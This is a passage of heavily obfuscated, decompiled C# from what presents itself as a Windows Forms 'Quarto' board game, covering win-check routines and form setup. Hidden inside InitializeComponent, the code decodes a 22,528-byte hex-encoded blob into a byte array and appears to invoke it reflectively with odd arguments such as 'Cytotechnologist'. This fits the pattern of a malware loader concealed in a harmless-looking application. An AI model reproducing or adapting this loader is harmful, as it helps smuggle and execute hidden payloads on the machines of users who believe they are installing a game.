				case 63u:
				{
					int num66;
					if (mem[0, num3].Dark != mem[1, num3].Dark)
					{
						num = -1451305855;
						num66 = -1451305855;
					}
					else
					{
						num = -1172510063;
						num66 = -1172510063;
					}
					continue;
				}
				case 62u:
					if (mem[0, num3] != null)
					{
						num = -26676404;
						continue;
					}
					goto IL_01e4;
				case 61u:
					flag2 = true;
					num = ((int)num2 * -2081692600) ^ 0x23E603CA;
					continue;
				case 60u:
				{
					int num50;
					int num51;
					if (mem[0, 0].Big != mem[1, 1].Big)
					{
						num50 = -1605155809;
						num51 = -1605155809;
					}
					else
					{
						num50 = -237562440;
						num51 = -237562440;
					}
					num = num50 ^ (int)(num2 * 249423052);
					continue;
				}
				case 59u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = (int)((num2 * 6686511) ^ 0x238963F2);
						continue;
					}
					goto IL_0064;
				case 58u:
				{
					int num45;
					if (mem[num3, 0] != null)
					{
						num = -787034690;
						num45 = -787034690;
					}
					else
					{
						num = -722011853;
						num45 = -722011853;
					}
					continue;
				}
				case 57u:
					if (mem[2, num3].Point != mem[3, num3].Point)
					{
						num = (int)((num2 * 1416186492) ^ 0x243E0351);
						continue;
					}
					goto IL_01f0;
				case 55u:
					num = -50197049;
					continue;
				case 54u:
				{
					int num18;
					int num19;
					if (mem[3, 3] == null)
					{
						num18 = 559045659;
						num19 = 559045659;
					}
					else
					{
						num18 = 450965407;
						num19 = 450965407;
					}
					num = num18 ^ ((int)num2 * -2033193738);
					continue;
				}
				case 53u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)(num2 * 1539675156) ^ -625741227;
						continue;
					}
					goto IL_0476;
				case 52u:
				{
					int num7;
					int num8;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num7 = -49879192;
						num8 = -49879192;
					}
					else
					{
						num7 = -1879772915;
						num8 = -1879772915;
					}
					num = num7 ^ ((int)num2 * -953441559);
					continue;
				}
				case 51u:
				{
					int num67;
					int num68;
					if (mem[1, 2].Big != mem[2, 1].Big)
					{
						num67 = -1811346310;
						num68 = -1811346310;
					}
					else
					{
						num67 = -889303714;
						num68 = -889303714;
					}
					num = num67 ^ (int)(num2 * 886310678);
					continue;
				}
				case 50u:
				{
					int num58;
					int num59;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num58 = 1649072476;
						num59 = 1649072476;
					}
					else
					{
						num58 = 155952486;
						num59 = 155952486;
					}
					num = num58 ^ ((int)num2 * -60530010);
					continue;
				}
				case 49u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = ((int)num2 * -533385371) ^ 0x2451D5EC;
						continue;
					}
					goto IL_056e;
				case 48u:
					num3++;
					num = ((int)num2 * -151409497) ^ 0xEACF046;
					continue;
				case 47u:
					if (mem[0, num3].Square == mem[1, num3].Square)
					{
						num = -1102329643;
						continue;
					}
					goto IL_01e4;
				case 46u:
				{
					int num48;
					int num49;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num48 = 555385996;
						num49 = 555385996;
					}
					else
					{
						num48 = 1890600936;
						num49 = 1890600936;
					}
					num = num48 ^ ((int)num2 * -468591499);
					continue;
				}
				case 45u:
				{
					int num40;
					int num41;
					if (mem[num3, 1].Big == mem[num3, 2].Big)
					{
						num40 = -160802617;
						num41 = -160802617;
					}
					else
					{
						num40 = -496071359;
						num41 = -496071359;
					}
					num = num40 ^ (int)(num2 * 404989);
					continue;
				}
				case 44u:
					if (mem[num3, 2].Big != mem[num3, 3].Big)
					{
						num = (int)((num2 * 834595328) ^ 0x7C576589);
						continue;
					}
					goto IL_01f0;
				case 43u:
				{
					int num34;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = -556676507;
						num34 = -556676507;
					}
					else
					{
						num = -287264606;
						num34 = -287264606;
					}
					continue;
				}
				case 41u:
					flag2 = false;
					num = (int)(num2 * 988886661) ^ -531937209;
					continue;
				case 40u:
					if (mem[2, num3].Square != mem[3, num3].Square)
					{
						goto IL_01e4;
					}
					goto IL_01f0;
				case 39u:
					flag3 = num3 < 4;
					num = -1703699068;
					continue;
				case 38u:
					flag2 = true;
					num = ((int)num2 * -1826473322) ^ -1798669313;
					continue;
				case 37u:
				{
					int num22;
					int num23;
					if (mem[0, num3].Big == mem[1, num3].Big)
					{
						num22 = 312464367;
						num23 = 312464367;
					}
					else
					{
						num22 = 2025207332;
						num23 = 2025207332;
					}
					num = num22 ^ ((int)num2 * -684493155);
					continue;
				}
				case 36u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = (int)(num2 * 1791186819) ^ -172023546;
						continue;
					}
					goto IL_0476;
				case 35u:
					if (mem[2, 1] != null)
					{
						num = (int)(num2 * 51001951) ^ -2039546870;
						continue;
					}
					goto IL_078d;
				case 34u:
					if (mem[1, num3] != null)
					{
						num = (int)((num2 * 1457718180) ^ 0xD878BD8);
						continue;
					}
					goto IL_01e4;
				case 33u:
					if (mem[2, num3] != null)
					{
						num = (int)((num2 * 1244041402) ^ 0x239FEE5C);
						continue;
					}
					goto IL_01e4;
				case 32u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = (int)(num2 * 783113395) ^ -1131292109;
						continue;
					}
					goto IL_056e;
				case 31u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -577555806) ^ 0x75080FC7;
						continue;
					}
					goto IL_0476;
				case 30u:
					num10 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_0065;
				case 29u:
				{
					int num69;
					int num70;
					if (mem[0, 0] == null)
					{
						num69 = 1223052997;
						num70 = 1223052997;
					}
					else
					{
						num69 = 584077756;
						num70 = 584077756;
					}
					num = num69 ^ (int)(num2 * 1984804671);
					continue;
				}
				case 28u:
					if (mem[num3, 2].Point != mem[num3, 3].Point)
					{
						num = ((int)num2 * -1837136944) ^ -1359330177;
						continue;
					}
					goto IL_01f0;
				case 27u:
				{
					int num64;
					int num65;
					if (mem[1, num3].Big != mem[2, num3].Big)
					{
						num64 = 739160862;
						num65 = 739160862;
					}
					else
					{
						num64 = 1418655982;
						num65 = 1418655982;
					}
					num = num64 ^ (int)(num2 * 580163799);
					continue;
				}
				case 26u:
				{
					int num60;
					int num61;
					if (mem[num3, 3] == null)
					{
						num60 = -195675109;
						num61 = -195675109;
					}
					else
					{
						num60 = -1751704819;
						num61 = -1751704819;
					}
					num = num60 ^ ((int)num2 * -846904772);
					continue;
				}
				case 25u:
					if (mem[2, num3].Dark != mem[3, num3].Dark)
					{
						num = (int)((num2 * 2049070075) ^ 0x2F5FBB9E);
						continue;
					}
					goto IL_01f0;
				case 24u:
				{
					int num56;
					if (mem[0, num3].Point != mem[1, num3].Point)
					{
						num = -1796050323;
						num56 = -1796050323;
					}
					else
					{
						num = -1506337153;
						num56 = -1506337153;
					}
					continue;
				}
				case 23u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -1385713186) ^ 0x43B64D42;
						continue;
					}
					goto IL_0476;
				case 22u:
					result = flag2;
					num = -90846427;
					continue;
				case 21u:
					if (mem[3, num3] != null)
					{
						num = ((int)num2 * -1639578192) ^ -28052716;
						continue;
					}
					goto IL_01e4;
				case 20u:
				{
					int num52;
					int num53;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num52 = 251831519;
						num53 = 251831519;
					}
					else
					{
						num52 = 1525119839;
						num53 = 1525119839;
					}
					num = num52 ^ ((int)num2 * -785136255);
					continue;
				}
				case 19u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = (int)(num2 * 448781510) ^ -1224016510;
						continue;
					}
					goto IL_056e;
				case 18u:
					num3 = 0;
					num = (int)(num2 * 1222740002) ^ -1387106853;
					continue;
				case 17u:
				{
					int num47;
					if (mem[num3, 0].Point != mem[num3, 1].Point)
					{
						num = -1702274961;
						num47 = -1702274961;
					}
					else
					{
						num = -1731330562;
						num47 = -1731330562;
					}
					continue;
				}
				case 16u:
				{
					int num42;
					int num43;
					if (mem[2, 2] != null)
					{
						num42 = -1160972796;
						num43 = -1160972796;
					}
					else
					{
						num42 = -269413141;
						num43 = -269413141;
					}
					num = num42 ^ (int)(num2 * 445333557);
					continue;
				}
				case 15u:
				{
					int num39;
					if (mem[num3, 0].Dark != mem[num3, 1].Dark)
					{
						num = -1682621541;
						num39 = -1682621541;
					}
					else
					{
						num = -2097785265;
						num39 = -2097785265;
					}
					continue;
				}
				case 14u:
				{
					int num35;
					int num36;
					if (mem[num3, 1] != null)
					{
						num35 = -468724729;
						num36 = -468724729;
					}
					else
					{
						num35 = -1896877567;
						num36 = -1896877567;
					}
					num = num35 ^ ((int)num2 * -1020632966);
					continue;
				}
				case 13u:
				{
					int num32;
					int num33;
					if (mem[0, 3].Big != mem[1, 2].Big)
					{
						num32 = -1767193480;
						num33 = -1767193480;
					}
					else
					{
						num32 = -62667040;
						num33 = -62667040;
					}
					num = num32 ^ ((int)num2 * -1000098460);
					continue;
				}
				case 12u:
					if (mem[num3, 2].Dark != mem[num3, 3].Dark)
					{
						num = (int)((num2 * 887895136) ^ 0x126D435B);
						continue;
					}
					goto IL_01f0;
				case 11u:
				{
					int num28;
					int num29;
					if (mem[num3, 1].Square != mem[num3, 2].Square)
					{
						num28 = 1359972036;
						num29 = 1359972036;
					}
					else
					{
						num28 = 573503050;
						num29 = 573503050;
					}
					num = num28 ^ (int)(num2 * 29719881);
					continue;
				}
				case 10u:
				{
					int num20;
					int num21;
					if (mem[num3, 0].Big == mem[num3, 1].Big)
					{
						num20 = 1064642917;
						num21 = 1064642917;
					}
					else
					{
						num20 = 381908919;
						num21 = 381908919;
					}
					num = num20 ^ (int)(num2 * 1108348733);
					continue;
				}
				case 9u:
					if (mem[3, 0] != null)
					{
						num = (int)(num2 * 1496846160) ^ -398609685;
						continue;
					}
					goto IL_078d;
				case 8u:
					if (mem[0, 3] != null)
					{
						num = -1231528750;
						continue;
					}
					goto IL_078d;
				case 7u:
				{
					int num17;
					if (mem[0, 0].Dark != mem[1, 1].Dark)
					{
						num = -2121370690;
						num17 = -2121370690;
					}
					else
					{
						num = -1908599288;
						num17 = -1908599288;
					}
					continue;
				}
				case 6u:
					num = (int)((num2 * 582826394) ^ 0x1B346626);
					continue;
				case 5u:
					if (mem[2, num3].Big != mem[3, num3].Big)
					{
						num = (int)((num2 * 227613507) ^ 0x3688D7CB);
						continue;
					}
					goto IL_01f0;
				case 4u:
					if (mem[1, 2] != null)
					{
						num = ((int)num2 * -1015658687) ^ -1045287059;
						continue;
					}
					goto IL_078d;
				case 3u:
				{
					int num13;
					int num14;
					if (mem[num3, 1].Dark == mem[num3, 2].Dark)
					{
						num13 = -2120582487;
						num14 = -2120582487;
					}
					else
					{
						num13 = -1762357885;
						num14 = -1762357885;
					}
					num = num13 ^ (int)(num2 * 979974970);
					continue;
				}
				case 2u:
				{
					int num11;
					int num12;
					if (mem[1, num3].Dark == mem[2, num3].Dark)
					{
						num11 = 178895198;
						num12 = 178895198;
					}
					else
					{
						num11 = 1717559489;
						num12 = 1717559489;
					}
					num = num11 ^ (int)(num2 * 574644256);
					continue;
				}
				case 1u:
					if (mem[num3, 2].Square != mem[num3, 3].Square)
					{
						num = (int)((num2 * 1202805276) ^ 0x2F7402BB);
						continue;
					}
					goto IL_01f0;
				case 0u:
				{
					int num4;
					int num5;
					if (mem[1, num3].Point == mem[2, num3].Point)
					{
						num4 = 32938750;
						num5 = 32938750;
					}
					else
					{
						num4 = 583281137;
						num5 = 583281137;
					}
					num = num4 ^ (int)(num2 * 1642203677);
					continue;
				}
				case 42u:
					break;
				default:
					{
						return result;
					}
					IL_01e4:
					num = -578080243;
					num6 = -578080243;
					continue;
					IL_0476:
					num10 = 1;
					goto IL_0065;
					IL_078d:
					num10 = 0;
					goto IL_0065;
					IL_01f0:
					num = -2100561544;
					num6 = -2100561544;
					continue;
					IL_0064:
					num10 = 0;
					goto IL_0065;
					IL_056e:
					num10 = 1;
					goto IL_0065;
					IL_0065:
					flag = (byte)num10 != 0;
					num = -811353311;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = true;
		int num = 0;
		int num4 = default(int);
		bool result = default(bool);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		while (true)
		{
			int num2 = -183175797;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0xD9963ECEu) % 13u)
				{
				case 12u:
					num4 = 0;
					num2 = -825965602;
					continue;
				case 11u:
					flag = false;
					num2 = (int)(num3 * 551367740) ^ -1407966200;
					continue;
				case 10u:
					num4++;
					num2 = -825965602;
					continue;
				case 9u:
					num++;
					num2 = (int)(num3 * 1933337786) ^ -857931633;
					continue;
				case 8u:
					result = flag;
					num2 = (int)(num3 * 1369142724) ^ -1867623749;
					continue;
				case 7u:
					flag2 = num < 4;
					num2 = -1698137296;
					continue;
				case 6u:
				{
					int num8;
					int num9;
					if (flag3)
					{
						num8 = -1041369370;
						num9 = -1041369370;
					}
					else
					{
						num8 = -441270292;
						num9 = -441270292;
					}
					num2 = num8 ^ (int)(num3 * 792388218);
					continue;
				}
				case 5u:
					flag3 = mem[num, num4] == null;
					num2 = -1843148532;
					continue;
				case 3u:
					num2 = (int)((num3 * 272494852) ^ 0x17A55EE1);
					continue;
				case 2u:
				{
					int num6;
					int num7;
					if (flag2)
					{
						num6 = 1636988496;
						num7 = 1636988496;
					}
					else
					{
						num6 = 2131385454;
						num7 = 2131385454;
					}
					num2 = num6 ^ (int)(num3 * 120413418);
					continue;
				}
				case 1u:
				{
					int num5;
					if (num4 >= 4)
					{
						num2 = -1661140049;
						num5 = -1661140049;
					}
					else
					{
						num2 = -871340242;
						num5 = -871340242;
					}
					continue;
				}
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		Form1.smethod_32((Control)(object)label5, "Игрок: ");
		while (true)
		{
			int num = 33072382;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x506FF0F4u) % 9u)
				{
				case 8u:
					Form1.smethod_32((Control)(object)label6, str);
					num = ((int)num2 * -732134363) ^ 0x72AC05B5;
					continue;
				case 6u:
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -26988097) ^ -1652842812;
					continue;
				case 5u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = ((int)num2 * -624839191) ^ 0x3BEB7C20;
					continue;
				case 4u:
					num = ((int)num2 * -871685847) ^ 0xCBE16C3;
					continue;
				case 3u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -1258907216) ^ -1659054201;
					continue;
				case 2u:
					num = ((int)num2 * -539987733) ^ -631952865;
					continue;
				case 0u:
					num = ((int)num2 * -1901837694) ^ -337924448;
					continue;
				default:
					return;
				case 7u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		while (true)
		{
			int num = -970179826;
			while (true)
			{
				uint num2;
				int num3;
				switch ((num2 = (uint)num ^ 0xD2974C55u) % 8u)
				{
				case 7u:
					Form1.smethod_51((IDisposable)components);
					num = ((int)num2 * -1106022813) ^ 0x22B3AC69;
					continue;
				case 6u:
					num = ((int)num2 * -1553013207) ^ -792778146;
					continue;
				case 4u:
					if (components != null)
					{
						num = -65792697;
						num3 = -65792697;
						continue;
					}
					goto IL_003a;
				case 3u:
					if (disposing)
					{
						num = ((int)num2 * -528650819) ^ -1706121858;
						continue;
					}
					goto IL_003a;
				case 2u:
					num = ((int)num2 * -432432315) ^ -1513793568;
					continue;
				case 1u:
					((Form)this).Dispose(disposing);
					num = -944465205;
					continue;
				default:
					return;
				case 0u:
					break;
				case 5u:
					return;
					IL_003a:
					num = -1810760572;
					num3 = -1810760572;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		components = Form1.smethod_52();
		object[] object_ = default(object[]);
		bool flag = default(bool);
		int num3 = default(int);
		byte[] array = default(byte[]);
		string sa = default(string);
		while (true)
		{
			int num = -944372254;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x826A21DEu) % 127u)
				{
				case 126u:
					Form1.smethod_59((Control)(object)this);
					num = ((int)num2 * -1213750972) ^ 0x5FE99863;
					continue;
				case 125u:
					num = ((int)num2 * -1542040698) ^ 0x16BD0504;
					continue;
				case 124u:
					num = (int)((num2 * 1668852933) ^ 0x31CBCFF8);
					continue;
				case 123u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = ((int)num2 * -1112277462) ^ -644003298;
					continue;
				case 122u:
					num = ((int)num2 * -1045023850) ^ -25474348;
					continue;
				case 121u:
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					label6 = Form1.smethod_57();
					num = (int)((num2 * 1517680471) ^ 0x62787294);
					continue;
				case 120u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -555872026) ^ -976200989;
					continue;
				case 119u:
					Form1.smethod_70(ComMember, object_);
					num = ((int)num2 * -346603876) ^ 0x1971FD2;
					continue;
				case 118u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = (int)((num2 * 947695032) ^ 0x4610DC24);
					continue;
				case 117u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = ((int)num2 * -1577347285) ^ 0x59CAA385;
					continue;
				case 116u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)(num2 * 1356429584) ^ -1944458356;
					continue;
				case 115u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)((num2 * 1529558486) ^ 0x1425436D);
					continue;
				case 114u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1701243016) ^ 0x7C7C32F5;
					continue;
				case 113u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -1368577236) ^ -996425572;
					continue;
				case 112u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = ((int)num2 * -1708493027) ^ 0xD0182D5;
					continue;
				case 111u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -118928519) ^ -1153216376;
					continue;
				case 110u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = ((int)num2 * -66748782) ^ 0x14CB213A;
					continue;
				case 109u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)((num2 * 1557275619) ^ 0x65337F8C);
					continue;
				case 108u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = (int)(num2 * 1902368938) ^ -2137218540;
					continue;
				case 107u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = (int)(num2 * 1899375944) ^ -1926931853;
					continue;
				case 106u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = 2015344728;
						num5 = 2015344728;
					}
					else
					{
						num4 = 52424425;
						num5 = 52424425;
					}
					num = num4 ^ (int)(num2 * 962013059);
					continue;
				}
				case 105u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = (int)((num2 * 105971632) ^ 0xFB6036F);
					continue;
				case 104u:
					num = (int)((num2 * 1705670563) ^ 0x190253BE);
					continue;
				case 103u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = (int)(num2 * 2063584097) ^ -1081937739;
					continue;
				case 102u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = (int)(num2 * 1134382256) ^ -548186428;
					continue;
				case 101u:
					num = (int)(num2 * 877461581) ^ -1988317252;
					continue;
				case 100u:
					num = ((int)num2 * -84795758) ^ -474194095;
					continue;
				case 99u:
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -1292706950) ^ 0x4CF1BABB;
					continue;
				case 98u:
					num = (int)(num2 * 868280647) ^ -948295197;
					continue;
				case 97u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = (int)(num2 * 1518142132) ^ -698951677;
					continue;
				case 96u:
					num3 = 0;
					num = ((int)num2 * -1449367203) ^ 0x23469125;
					continue;
				case 95u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = (int)((num2 * 262353975) ^ 0x51B154F5);
					continue;
				case 94u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = (int)((num2 * 1436180327) ^ 0x5AF066A8);
					continue;
				case 93u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = (int)((num2 * 637629392) ^ 0x1032F868);
					continue;
				case 92u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -306458280) ^ -899239944;
					continue;
				case 91u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = (int)(num2 * 123597299) ^ -400959822;
					continue;
				case 90u:
					CharArray(array, string.Empty);
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -1858081431) ^ -1080888908;
					continue;
				case 89u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = ((int)num2 * -1548080240) ^ 0x1D1C6191;
					continue;
				case 88u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = ((int)num2 * -180158928) ^ -54698435;
					continue;
				case 87u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = ((int)num2 * -48092247) ^ 0x39EE387C;
					continue;
				case 86u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = ((int)num2 * -1985580642) ^ 0x2AB137F9;
					continue;
				case 85u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = ((int)num2 * -1135646374) ^ 0x3E29E1D9;
					continue;
				case 84u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 353588490) ^ -1537856724;
					continue;
				case 83u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -180389573) ^ -163637270;
					continue;
				case 82u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -793043123) ^ 0x652FE83B;
					continue;
				case 81u:
					num = ((int)num2 * -2126213481) ^ 0x2EA031DE;
					continue;
				case 80u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -267898328) ^ 0x7B3B207A;
					continue;
				case 79u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)(num2 * 1195949847) ^ -481779655;
					continue;
				case 78u:
					num = ((int)num2 * -277983922) ^ -2004418640;
					continue;
				case 77u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = ((int)num2 * -1987149782) ^ -1197266933;
					continue;
				case 76u:
					num = ((int)num2 * -1806864499) ^ 0x30666B66;
					continue;
				case 75u:
					num = ((int)num2 * -1033028646) ^ -50775520;
					continue;
				case 74u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -1257938550) ^ 0x7F459183;
					continue;
				case 73u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = (int)((num2 * 2011735251) ^ 0x7F335296);
					continue;
				case 72u:
					num = (int)((num2 * 601816200) ^ 0x6BB7B159);
					continue;
				case 71u:
					num = ((int)num2 * -227519977) ^ -1806365307;
					continue;
				case 70u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = ((int)num2 * -890474714) ^ 0x6BDD7CD;
					continue;
				case 69u:
					num = (int)(num2 * 847290022) ^ -1009384144;
					continue;
				case 68u:
					num = (int)(num2 * 1506866606) ^ -1936243753;
					continue;
				case 67u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)(num2 * 2089641578) ^ -1288455224;
					continue;
				case 66u:
					button2 = Form1.smethod_53();
					button1 = Form1.smethod_53();
					num = (int)(num2 * 1871472170) ^ -2083094524;
					continue;
				case 65u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -1407162748) ^ 0x397481BE;
					continue;
				case 64u:
					num = ((int)num2 * -1962126381) ^ 0x45B57DD7;
					continue;
				case 63u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = ((int)num2 * -1732878754) ^ 0x20AB28C7;
					continue;
				case 61u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -1953506814) ^ 0x2628C560;
					continue;
				case 60u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)(num2 * 1736474112) ^ -391411301;
					continue;
				case 59u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = (int)((num2 * 1130110723) ^ 0x4D683AD5);
					continue;
				case 58u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(sa, num3 * 2, 2), 16);
					num = -1613689584;
					continue;
				case 57u:
					num = (int)((num2 * 1401322067) ^ 0x6E66F526);
					continue;
				case 56u:
					num = ((int)num2 * -855777028) ^ 0x61C0538B;
					continue;
				case 55u:
					num = ((int)num2 * -1484179932) ^ 0x41ABCE37;
					continue;
				case 54u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)(num2 * 1363590452) ^ -451083643;
					continue;
				case 53u:
					num = ((int)num2 * -906178333) ^ 0xA623F9A;
					continue;
				case 52u:
					num = ((int)num2 * -1130602257) ^ 0x2493C7BB;
					continue;
				case 51u:
					num = (int)((num2 * 1756236953) ^ 0x61C2C453);
					continue;
				case 50u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -810174762) ^ -852160922;
					continue;
				case 49u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = ((int)num2 * -144366194) ^ -1377752280;
					continue;
				case 48u:
					num = (int)(num2 * 1864377599) ^ -1264148729;
					continue;
				case 47u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)((num2 * 1885019554) ^ 0x5DEEA825);
					continue;
				case 46u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = (int)((num2 * 2005176339) ^ 0xEC8034D);
					continue;
				case 45u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = (int)((num2 * 1976234385) ^ 0x2F8E3B4A);
					continue;
				case 44u:
					num = ((int)num2 * -263637351) ^ -1922117643;
					continue;
				case 43u:
					num = (int)(num2 * 2007910024) ^ -1994857751;
					continue;
				case 42u:
					Form1.smethod_85((Control)(object)this, "Form1");
					Form1.smethod_86((Form)(object)this, bool_0: false);
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = (int)(num2 * 403846630) ^ -1254597279;
					continue;
				case 41u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = ((int)num2 * -732505235) ^ 0xA068FB4;
					continue;
				case 40u:
					pictureBox1 = Form1.smethod_2();
					num = (int)(num2 * 1848947292) ^ -775396997;
					continue;
				case 39u:
					num = ((int)num2 * -1024184846) ^ -1843018466;
					continue;
				case 38u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = ((int)num2 * -37792218) ^ 0x68674A99;
					continue;
				case 37u:
					num = ((int)num2 * -1446490988) ^ 0xC77E89E;
					continue;
				case 36u:
					Form1.smethod_72(timer1, 1000);
					num = ((int)num2 * -1849859096) ^ 0x24CAF225;
					continue;
				case 35u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -468085334) ^ 0x2D9B696E;
					continue;
				case 34u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)(num2 * 342506828) ^ -1905342273;
					continue;
				case 33u:
					num = (int)((num2 * 1208604645) ^ 0x363A94C5);
					continue;
				case 32u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)((num2 * 1216077996) ^ 0x32D72803);
					continue;
				case 31u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = (int)(num2 * 534401593) ^ -1862442343;
					continue;
				case 30u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -573311487) ^ 0x715F0889;
					continue;
				case 29u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)(num2 * 925243577) ^ -659799224;
					continue;
				case 28u:
					sa = Form1.smethod_34(sa, Veet.Zr);
					array = new byte[22528];
					num = (int)(num2 * 395303627) ^ -1516166957;
					continue;
				case 27u:
					num = ((int)num2 * -1906968407) ^ -1298899246;
					continue;
				case 26u:
